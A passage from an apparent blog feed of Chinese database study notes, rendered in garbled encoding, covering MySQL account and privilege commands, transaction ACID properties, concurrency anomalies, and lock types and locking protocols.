<span>ORDER</span> <span>BY</span> col <span>COLLATE</span> latin1_general_ci<span>;</span>
</code></pre></div><h1 id="äºŒåä¸‰ã€æƒé™ç®¡ç†" tabindex="-1"> äºŒåä¸‰ã€æƒé™ç®¡ç†</h1>
<p>MySQL çš„è´¦æˆ·ä¿¡æ¯ä¿å­˜åœ¨ mysql è¿™ä¸ªæ•°æ®åº“ä¸­ã€‚</p>
<div><pre><code><span>USE</span> mysql<span>;</span>
<span>SELECT</span> <span>user</span> <span>FROM</span> <span>user</span><span>;</span>
</code></pre></div><p><strong>åˆ›å»ºè´¦æˆ·</strong></p>
<p>æ–°åˆ›å»ºçš„è´¦æˆ·æ²¡æœ‰ä»»ä½•æƒé™ã€‚</p>
<div><pre><code><span>CREATE</span> <span>USER</span> myuser IDENTIFIED <span>BY</span> <span>'mypassword'</span><span>;</span>
</code></pre></div><p><strong>ä¿®æ”¹è´¦æˆ·å</strong></p>
<div><pre><code><span>RENAME</span> <span>USER</span> myuser <span>TO</span> newuser<span>;</span>
</code></pre></div><p><strong>åˆ é™¤è´¦æˆ·</strong></p>
<div><pre><code><span>DROP</span> <span>USER</span> myuser<span>;</span>
</code></pre></div><p><strong>æŸ¥çœ‹æƒé™</strong></p>
<div><pre><code><span>SHOW</span> GRANTS <span>FOR</span> myuser<span>;</span>
</code></pre></div><p><strong>æˆäºˆæƒé™</strong></p>
<p>è´¦æˆ·ç”¨ username@host çš„å½¢å¼å®šä¹‰ï¼Œusername@% ä½¿ç”¨çš„æ˜¯é»˜è®¤ä¸»æœºåã€‚</p>
<div><pre><code><span>GRANT</span> <span>SELECT</span><span>,</span> <span>INSERT</span> <span>ON</span> mydatabase<span>.</span><span>*</span> <span>TO</span> myuser<span>;</span>
</code></pre></div><p><strong>åˆ é™¤æƒé™</strong></p>
<p>GRANT å’Œ REVOKE å¯åœ¨å‡ ä¸ªå±‚æ¬¡ä¸Šæ§åˆ¶è®¿é—®æƒé™ï¼š</p>
<ul>
<li>æ•´ä¸ªæœåŠ¡å™¨ï¼Œä½¿ç”¨ GRANT ALL å’Œ REVOKE ALLï¼›</li>
<li>æ•´ä¸ªæ•°æ®åº“ï¼Œä½¿ç”¨ ON database.*ï¼›</li>
<li>ç‰¹å®šçš„è¡¨ï¼Œä½¿ç”¨ ON database.tableï¼›</li>
<li>ç‰¹å®šçš„åˆ—ï¼›</li>
<li>ç‰¹å®šçš„å­˜å‚¨è¿‡ç¨‹ã€‚</li>
</ul>
<div><pre><code><span>REVOKE</span> <span>SELECT</span><span>,</span> <span>INSERT</span> <span>ON</span> mydatabase<span>.</span><span>*</span> <span>FROM</span> myuser<span>;</span>
</code></pre></div><p><strong>æ›´æ”¹å¯†ç </strong></p>
<p>å¿…é¡»ä½¿ç”¨ Password() å‡½æ•°è¿›è¡ŒåŠ å¯†ã€‚</p>
<div><pre><code><span>SET</span> PASSWROD <span>FOR</span> myuser <span>=</span> Password<span>(</span><span>'new_password'</span><span>)</span><span>;</span>
</code></pre></div><h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>BenForta. SQL å¿…çŸ¥å¿…ä¼š [M]. äººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾, 2013.</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">æ•°æ®åº“ç³»ç»ŸåŸç†</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.html"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€ã€äº‹åŠ¡" tabindex="-1"> ä¸€ã€äº‹åŠ¡</h1>
<h2 id="æ¦‚å¿µ" tabindex="-1"> æ¦‚å¿µ</h2>
<p>äº‹åŠ¡æŒ‡çš„æ˜¯æ»¡è¶³ ACID ç‰¹æ€§çš„ä¸€ç»„æ“ä½œï¼Œå¯ä»¥é€šè¿‡ Commit æäº¤ä¸€ä¸ªäº‹åŠ¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Rollback è¿›è¡Œå›æ»šã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f74144be-857a-40cd-8ec7-87626ef4e20b.png" width="400px"> </div><br>
<h2 id="acid" tabindex="-1"> ACID</h2>
<h3 id="_1-åŸå­æ€§-atomicity" tabindex="-1"> 1. åŸå­æ€§ï¼ˆAtomicityï¼‰</h3>
<p>äº‹åŠ¡è¢«è§†ä¸ºä¸å¯åˆ†å‰²çš„æœ€å°å•å…ƒï¼Œäº‹åŠ¡çš„æ‰€æœ‰æ“ä½œè¦ä¹ˆå…¨éƒ¨æäº¤æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥å›æ»šã€‚</p>
<p>å›æ»šå¯ä»¥ç”¨å›æ»šæ—¥å¿—æ¥å®ç°ï¼Œå›æ»šæ—¥å¿—è®°å½•ç€äº‹åŠ¡æ‰€æ‰§è¡Œçš„ä¿®æ”¹æ“ä½œï¼Œåœ¨å›æ»šæ—¶åå‘æ‰§è¡Œè¿™äº›ä¿®æ”¹æ“ä½œå³å¯ã€‚</p>
<h3 id="_2-ä¸€è‡´æ€§-consistency" tabindex="-1"> 2. ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰</h3>
<p>æ•°æ®åº“åœ¨äº‹åŠ¡æ‰§è¡Œå‰åéƒ½ä¿æŒä¸€è‡´æ€§çŠ¶æ€ã€‚åœ¨ä¸€è‡´æ€§çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰äº‹åŠ¡å¯¹ä¸€ä¸ªæ•°æ®çš„è¯»å–ç»“æœéƒ½æ˜¯ç›¸åŒçš„ã€‚</p>
<h3 id="_3-éš”ç¦»æ€§-isolation" tabindex="-1"> 3. éš”ç¦»æ€§ï¼ˆIsolationï¼‰</h3>
<p>ä¸€ä¸ªäº‹åŠ¡æ‰€åšçš„ä¿®æ”¹åœ¨æœ€ç»ˆæäº¤ä»¥å‰ï¼Œå¯¹å…¶å®ƒäº‹åŠ¡æ˜¯ä¸å¯è§çš„ã€‚</p>
<h3 id="_4-æŒä¹…æ€§-durability" tabindex="-1"> 4. æŒä¹…æ€§ï¼ˆDurabilityï¼‰</h3>
<p>ä¸€æ—¦äº‹åŠ¡æäº¤ï¼Œåˆ™å…¶æ‰€åšçš„ä¿®æ”¹å°†ä¼šæ°¸è¿œä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚å³ä½¿ç³»ç»Ÿå‘ç”Ÿå´©æºƒï¼Œäº‹åŠ¡æ‰§è¡Œçš„ç»“æœä¹Ÿä¸èƒ½ä¸¢å¤±ã€‚</p>
<p>ä½¿ç”¨é‡åšæ—¥å¿—æ¥ä¿è¯æŒä¹…æ€§ã€‚</p>
<hr>
<p>äº‹åŠ¡çš„ ACID ç‰¹æ€§æ¦‚å¿µç®€å•ï¼Œä½†ä¸æ˜¯å¾ˆå¥½ç†è§£ï¼Œä¸»è¦æ˜¯å› ä¸ºè¿™å‡ ä¸ªç‰¹æ€§ä¸æ˜¯ä¸€ç§å¹³çº§å…³ç³»ï¼š</p>
<ul>
<li>åªæœ‰æ»¡è¶³ä¸€è‡´æ€§ï¼Œäº‹åŠ¡çš„æ‰§è¡Œç»“æœæ‰æ˜¯æ­£ç¡®çš„ã€‚</li>
<li>åœ¨æ— å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œäº‹åŠ¡ä¸²è¡Œæ‰§è¡Œï¼Œéš”ç¦»æ€§ä¸€å®šèƒ½å¤Ÿæ»¡è¶³ã€‚æ­¤æ—¶åªè¦èƒ½æ»¡è¶³åŸå­æ€§ï¼Œå°±ä¸€å®šèƒ½æ»¡è¶³ä¸€è‡´æ€§ã€‚</li>
<li>åœ¨å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œå¤šä¸ªäº‹åŠ¡å¹¶è¡Œæ‰§è¡Œï¼Œäº‹åŠ¡ä¸ä»…è¦æ»¡è¶³åŸå­æ€§ï¼Œè¿˜éœ€è¦æ»¡è¶³éš”ç¦»æ€§ï¼Œæ‰èƒ½æ»¡è¶³ä¸€è‡´æ€§ã€‚</li>
<li>äº‹åŠ¡æ»¡è¶³æŒä¹…åŒ–æ˜¯ä¸ºäº†èƒ½åº”å¯¹æ•°æ®åº“å´©æºƒçš„æƒ…å†µã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/417bc315-4409-48c6-83e0-59e8d405429e.jpg" width="400px"> </div><br>
<h2 id="autocommit" tabindex="-1"> AUTOCOMMIT</h2>
<p>MySQL é»˜è®¤é‡‡ç”¨è‡ªåŠ¨æäº¤æ¨¡å¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸æ˜¾å¼ä½¿ç”¨<code>START TRANSACTION</code>è¯­å¥æ¥å¼€å§‹ä¸€ä¸ªäº‹åŠ¡ï¼Œé‚£ä¹ˆæ¯ä¸ªæŸ¥è¯¢éƒ½ä¼šè¢«å½“åšä¸€ä¸ªäº‹åŠ¡è‡ªåŠ¨æäº¤ã€‚</p>
<h1 id="äºŒã€å¹¶å‘ä¸€è‡´æ€§é—®é¢˜" tabindex="-1"> äºŒã€å¹¶å‘ä¸€è‡´æ€§é—®é¢˜</h1>
<p>åœ¨å¹¶å‘ç¯å¢ƒä¸‹ï¼Œäº‹åŠ¡çš„éš”ç¦»æ€§å¾ˆéš¾ä¿è¯ï¼Œå› æ­¤ä¼šå‡ºç°å¾ˆå¤šå¹¶å‘ä¸€è‡´æ€§é—®é¢˜ã€‚</p>
<h2 id="ä¸¢å¤±ä¿®æ”¹" tabindex="-1"> ä¸¢å¤±ä¿®æ”¹</h2>
<p>T<sub>1</sub> å’Œ T<sub>2</sub> ä¸¤ä¸ªäº‹åŠ¡éƒ½å¯¹ä¸€ä¸ªæ•°æ®è¿›è¡Œä¿®æ”¹ï¼ŒT<sub>1</sub> å…ˆä¿®æ”¹ï¼ŒT<sub>2</sub> éšåä¿®æ”¹ï¼ŒT<sub>2</sub> çš„ä¿®æ”¹è¦†ç›–äº† T<sub>1</sub> çš„ä¿®æ”¹ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/75184b58-c627-4edc-8dcf-605762ebb733.png" width="320px"> </div><br>
<h2 id="è¯»è„æ•°æ®" tabindex="-1"> è¯»è„æ•°æ®</h2>
<p>T<sub>1</sub> ä¿®æ”¹ä¸€ä¸ªæ•°æ®ï¼ŒT<sub>2</sub> éšåè¯»å–è¿™ä¸ªæ•°æ®ã€‚å¦‚æœ T<sub>1</sub> æ’¤é”€äº†è¿™æ¬¡ä¿®æ”¹ï¼Œé‚£ä¹ˆ T<sub>2</sub> è¯»å–çš„æ•°æ®æ˜¯è„æ•°æ®ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/af0e94d9-502d-4531-938f-d46dd29de52d.png" width="360px"> </div><br>
<h2 id="ä¸å¯é‡å¤è¯»" tabindex="-1"> ä¸å¯é‡å¤è¯»</h2>
<p>T<sub>2</sub> è¯»å–ä¸€ä¸ªæ•°æ®ï¼ŒT<sub>1</sub> å¯¹è¯¥æ•°æ®åšäº†ä¿®æ”¹ã€‚å¦‚æœ T<sub>2</sub> å†æ¬¡è¯»å–è¿™ä¸ªæ•°æ®ï¼Œæ­¤æ—¶è¯»å–çš„ç»“æœå’Œç¬¬ä¸€æ¬¡è¯»å–çš„ç»“æœä¸åŒã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66ae164c-ad47-4905-895e-51fe38ce797a.png" width="360px"> </div><br>
<h2 id="å¹»å½±è¯»" tabindex="-1"> å¹»å½±è¯»</h2>
<p>T<sub>1</sub> è¯»å–æŸä¸ªèŒƒå›´çš„æ•°æ®ï¼ŒT<sub>2</sub> åœ¨è¿™ä¸ªèŒƒå›´å†…æ’å…¥æ–°çš„æ•°æ®ï¼ŒT<sub>1</sub> å†æ¬¡è¯»å–è¿™ä¸ªèŒƒå›´çš„æ•°æ®ï¼Œæ­¤æ—¶è¯»å–çš„ç»“æœå’Œå’Œç¬¬ä¸€æ¬¡è¯»å–çš„ç»“æœä¸åŒã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8fdc577d-552d-4b43-b5e4-a8f98bc2cb51.png" width="340px"> </div><br>
<hr>
<p>äº§ç”Ÿå¹¶å‘ä¸ä¸€è‡´æ€§é—®é¢˜ä¸»è¦åŸå› æ˜¯ç ´åäº†äº‹åŠ¡çš„éš”ç¦»æ€§ï¼Œè§£å†³æ–¹æ³•æ˜¯é€šè¿‡å¹¶å‘æ§åˆ¶æ¥ä¿è¯éš”ç¦»æ€§ã€‚å¹¶å‘æ§åˆ¶å¯ä»¥é€šè¿‡å°é”æ¥å®ç°ï¼Œä½†æ˜¯å°é”æ“ä½œéœ€è¦ç”¨æˆ·è‡ªå·±æ§åˆ¶ï¼Œç›¸å½“å¤æ‚ã€‚æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæä¾›äº†äº‹åŠ¡çš„éš”ç¦»çº§åˆ«ï¼Œè®©ç”¨æˆ·ä»¥ä¸€ç§æ›´è½»æ¾çš„æ–¹å¼å¤„ç†å¹¶å‘ä¸€è‡´æ€§é—®é¢˜ã€‚</p>
<h1 id="ä¸‰ã€å°é”" tabindex="-1"> ä¸‰ã€å°é”</h1>
<h2 id="å°é”ç²’åº¦" tabindex="-1"> å°é”ç²’åº¦</h2>
<p>MySQL ä¸­æä¾›äº†ä¸¤ç§å°é”ç²’åº¦ï¼šè¡Œçº§é”ä»¥åŠè¡¨çº§é”ã€‚</p>
<p>åº”è¯¥å°½é‡åªé”å®šéœ€è¦ä¿®æ”¹çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œè€Œä¸æ˜¯æ‰€æœ‰çš„èµ„æºã€‚é”å®šçš„æ•°æ®é‡è¶Šå°‘ï¼Œå‘ç”Ÿé”äº‰ç”¨çš„å¯èƒ½å°±è¶Šå°ï¼Œç³»ç»Ÿçš„å¹¶å‘ç¨‹åº¦å°±è¶Šé«˜ã€‚</p>
<p>ä½†æ˜¯åŠ é”éœ€è¦æ¶ˆè€—èµ„æºï¼Œé”çš„å„ç§æ“ä½œï¼ˆåŒ…æ‹¬è·å–é”ã€é‡Šæ”¾é”ã€ä»¥åŠæ£€æŸ¥é”çŠ¶æ€ï¼‰éƒ½ä¼šå¢åŠ ç³»ç»Ÿå¼€é”€ã€‚å› æ­¤å°é”ç²’åº¦è¶Šå°ï¼Œç³»ç»Ÿå¼€é”€å°±è¶Šå¤§ã€‚</p>
<p>åœ¨é€‰æ‹©å°é”ç²’åº¦æ—¶ï¼Œéœ€è¦åœ¨é”å¼€é”€å’Œå¹¶å‘ç¨‹åº¦ä¹‹é—´åšä¸€ä¸ªæƒè¡¡ã€‚</p>
<h2 id="å°é”ç±»å‹" tabindex="-1"> å°é”ç±»å‹</h2>
<h3 id="_1-è¯»å†™é”" tabindex="-1"> 1. è¯»å†™é”</h3>
<ul>
<li>æ’å®ƒé”ï¼ˆExclusiveï¼‰ï¼Œç®€å†™ä¸º X é”ï¼Œåˆç§°å†™é”ã€‚</li>
<li>å…±äº«é”ï¼ˆSharedï¼‰ï¼Œç®€å†™ä¸º S é”ï¼Œåˆç§°è¯»é”ã€‚</li>
</ul>
<p>æœ‰ä»¥ä¸‹ä¸¤ä¸ªè§„å®šï¼š</p>
<ul>
<li>ä¸€ä¸ªäº‹åŠ¡å¯¹æ•°æ®å¯¹è±¡ A åŠ äº† X é”ï¼Œå°±å¯ä»¥å¯¹ A è¿›è¡Œè¯»å–å’Œæ›´æ–°ã€‚åŠ é”æœŸé—´å…¶å®ƒäº‹åŠ¡ä¸èƒ½å¯¹ A åŠ ä»»ä½•é”ã€‚</li>
<li>ä¸€ä¸ªäº‹åŠ¡å¯¹æ•°æ®å¯¹è±¡ A åŠ äº† S é”ï¼Œå¯ä»¥å¯¹ A è¿›è¡Œè¯»å–æ“ä½œï¼Œä½†æ˜¯ä¸èƒ½è¿›è¡Œæ›´æ–°æ“ä½œã€‚åŠ é”æœŸé—´å…¶å®ƒäº‹åŠ¡èƒ½å¯¹ A åŠ  S é”ï¼Œä½†æ˜¯ä¸èƒ½åŠ  X é”ã€‚</li>
</ul>
<p>é”çš„å…¼å®¹å…³ç³»å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th style="text-align:center">X</th>
<th style="text-align:center">S</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>X</strong></td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">Ã—</td>
</tr>
<tr>
<td style="text-align:center"><strong>S</strong></td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">âˆš</td>
</tr>
</tbody>
</table>
<h3 id="_2-æ„å‘é”" tabindex="-1"> 2. æ„å‘é”</h3>
<p>ä½¿ç”¨æ„å‘é”ï¼ˆIntention Locksï¼‰å¯ä»¥æ›´å®¹æ˜“åœ°æ”¯æŒå¤šç²’åº¦å°é”ã€‚</p>
<p>åœ¨å­˜åœ¨è¡Œçº§é”å’Œè¡¨çº§é”çš„æƒ…å†µä¸‹ï¼Œäº‹åŠ¡ T æƒ³è¦å¯¹è¡¨ A åŠ  X é”ï¼Œå°±éœ€è¦å…ˆæ£€æµ‹æ˜¯å¦æœ‰å…¶å®ƒäº‹åŠ¡å¯¹è¡¨ A æˆ–è€…è¡¨ A ä¸­çš„ä»»æ„ä¸€è¡ŒåŠ äº†é”ï¼Œé‚£ä¹ˆå°±éœ€è¦å¯¹è¡¨ A çš„æ¯ä¸€è¡Œéƒ½æ£€æµ‹ä¸€æ¬¡ï¼Œè¿™æ˜¯éå¸¸è€—æ—¶çš„ã€‚</p>
<p>æ„å‘é”åœ¨åŸæ¥çš„ X/S é”ä¹‹ä¸Šå¼•å…¥äº† IX/ISï¼ŒIX/IS éƒ½æ˜¯è¡¨é”ï¼Œç”¨æ¥è¡¨ç¤ºä¸€ä¸ªäº‹åŠ¡æƒ³è¦åœ¨è¡¨ä¸­çš„æŸä¸ªæ•°æ®è¡Œä¸ŠåŠ  X é”æˆ– S é”ã€‚æœ‰ä»¥ä¸‹ä¸¤ä¸ªè§„å®šï¼š</p>
<ul>
<li>ä¸€ä¸ªäº‹åŠ¡åœ¨è·å¾—æŸä¸ªæ•°æ®è¡Œå¯¹è±¡çš„ S é”ä¹‹å‰ï¼Œå¿…é¡»å…ˆè·å¾—è¡¨çš„ IS é”æˆ–è€…æ›´å¼ºçš„é”ï¼›</li>
<li>ä¸€ä¸ªäº‹åŠ¡åœ¨è·å¾—æŸä¸ªæ•°æ®è¡Œå¯¹è±¡çš„ X é”ä¹‹å‰ï¼Œå¿…é¡»å…ˆè·å¾—è¡¨çš„ IX é”ã€‚</li>
</ul>
<p>é€šè¿‡å¼•å…¥æ„å‘é”ï¼Œäº‹åŠ¡ T æƒ³è¦å¯¹è¡¨ A åŠ  X é”ï¼Œåªéœ€è¦å…ˆæ£€æµ‹æ˜¯å¦æœ‰å…¶å®ƒäº‹åŠ¡å¯¹è¡¨ A åŠ äº† X/IX/S/IS é”ï¼Œå¦‚æœåŠ äº†å°±è¡¨ç¤ºæœ‰å…¶å®ƒäº‹åŠ¡æ­£åœ¨ä½¿ç”¨è¿™ä¸ªè¡¨æˆ–è€…è¡¨ä¸­æŸä¸€è¡Œçš„é”ï¼Œå› æ­¤äº‹åŠ¡ T åŠ  X é”å¤±è´¥ã€‚</p>
<p>å„ç§é”çš„å…¼å®¹å…³ç³»å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th style="text-align:center">X</th>
<th style="text-align:center">IX</th>
<th style="text-align:center">S</th>
<th style="text-align:center">IS</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>X</strong></td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">Ã—</td>
</tr>
<tr>
<td style="text-align:center"><strong>IX</strong></td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">âˆš</td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">âˆš</td>
</tr>
<tr>
<td style="text-align:center"><strong>S</strong></td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">âˆš</td>
<td style="text-align:center">âˆš</td>
</tr>
<tr>
<td style="text-align:center"><strong>IS</strong></td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">âˆš</td>
<td style="text-align:center">âˆš</td>
<td style="text-align:center">âˆš</td>
</tr>
</tbody>
</table>
<p>è§£é‡Šå¦‚ä¸‹ï¼š</p>
<ul>
<li>ä»»æ„ IS/IX é”ä¹‹é—´éƒ½æ˜¯å…¼å®¹çš„ï¼Œå› ä¸ºå®ƒä»¬åªæ˜¯è¡¨ç¤ºæƒ³è¦å¯¹è¡¨åŠ é”ï¼Œè€Œä¸æ˜¯çœŸæ­£åŠ é”ï¼›</li>
<li>S é”åªä¸ S é”å’Œ IS é”å…¼å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´äº‹åŠ¡ T æƒ³è¦å¯¹æ•°æ®è¡ŒåŠ  S é”ï¼Œå…¶å®ƒäº‹åŠ¡å¯ä»¥å·²ç»è·å¾—å¯¹è¡¨æˆ–è€…è¡¨ä¸­çš„è¡Œçš„ S é”ã€‚</li>
</ul>
<h2 id="å°é”åè®®" tabindex="-1"> å°é”åè®®</h2>
<h3 id="_1-ä¸‰çº§å°é”åè®®" tabindex="-1"> 1. ä¸‰çº§å°é”åè®®</h3>
<p><strong>ä¸€çº§å°é”åè®®</strong></p>
<p>äº‹åŠ¡ T è¦ä¿®æ”¹æ•°æ® A æ—¶å¿…é¡»åŠ  X é”ï¼Œç›´åˆ° T ç»“æŸæ‰é‡Šæ”¾é”ã€‚</p>
<p>å¯ä»¥è§£å†³ä¸¢å¤±ä¿®æ”¹é—®é¢˜ï¼Œå› ä¸ºä¸èƒ½åŒæ—¶æœ‰ä¸¤ä¸ªäº‹åŠ¡å¯¹åŒä¸€ä¸ªæ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆäº‹åŠ¡çš„ä¿®æ”¹å°±ä¸ä¼šè¢«è¦†ç›–ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">T<sub>1</sub></th>
<th style="text-align:center">T<sub>2</sub></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">lock-x(A)</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">read A=20</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">lock-x(A)</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">wait</td>
</tr>
<tr>
<td style="text-align:center">write A=19</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">commit</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">unlock-x(A)</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">obtain</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">read A=19</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">write A=21</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">commit</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">unlock-x(A)</td>
</tr>
</tbody>
</table>
<p><strong>äºŒçº§å°é”åè®®</strong></p>
<p>åœ¨ä¸€çº§çš„åŸºç¡€ä¸Šï¼Œè¦æ±‚è¯»å–æ•°æ® A æ—¶å¿…é¡»åŠ  S é”ï¼Œè¯»å–å®Œé©¬ä¸Šé‡Šæ”¾ S é”ã€‚</p>
<p>å¯ä»¥è§£å†³è¯»è„æ•°æ®é—®é¢˜ï¼Œå› ä¸ºå¦‚æœä¸€ä¸ªäº‹åŠ¡åœ¨å¯¹æ•°æ® A è¿›è¡Œä¿®æ”¹ï¼Œæ ¹æ® 1 çº§å°é”åè®®ï¼Œä¼šåŠ  X é”ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å†åŠ  S é”äº†ï¼Œä¹Ÿå°±æ˜¯ä¸ä¼šè¯»å…¥æ•°æ®ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">T<sub>1</sub></th>
<th style="text-align:center">T<sub>2</sub></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">lock-x(A)</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">read A=20</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">write A=19</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">lock-s(A)</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">wait</td>
</tr>
<tr>
<td style="text-align:center">rollback</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">A=20</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">unlock-x(A)</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">obtain</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">read A=20</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">unlock-s(A)</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">commit</td>
</tr>
</tbody>
</table>
<p><strong>ä¸‰çº§å°é”åè®®</strong></p>
<p>åœ¨äºŒçº§çš„åŸºç¡€ä¸Šï¼Œè¦æ±‚è¯»å–æ•°æ® A æ—¶å¿…é¡»åŠ  S é”ï¼Œç›´åˆ°äº‹åŠ¡ç»“æŸäº†æ‰èƒ½é‡Šæ”¾ S é”ã€‚</p>
<p>å¯ä»¥è§£å†³ä¸å¯é‡å¤è¯»çš„é—®é¢˜ï¼Œå› ä¸ºè¯» A æ—¶ï¼Œå…¶å®ƒäº‹åŠ¡ä¸èƒ½å¯¹ A åŠ  X é”ï¼Œä»è€Œé¿å…äº†åœ¨è¯»çš„æœŸé—´æ•°æ®å‘ç”Ÿæ”¹å˜ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">T<sub>1</sub></th>
<th style="text-align:center">T<sub>2</sub></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">lock-s(A)</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">read A=20</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">lock-x(A)</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">wait</td>
</tr>
<tr>
<td style="text-align:center">read A=20</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">commit</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">unlock-s(A)</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">obtain</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">read A=20</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">write A=19</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">commit</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">unlock-X(A)</td>
</tr>
</tbody>
</table>
<h3 id="_2-ä¸¤æ®µé”åè®®" tabindex="-1"> 2. ä¸¤æ®µé”åè®®</h3>
<p>åŠ é”å’Œè§£é”åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µè¿›è¡Œã€‚</p>
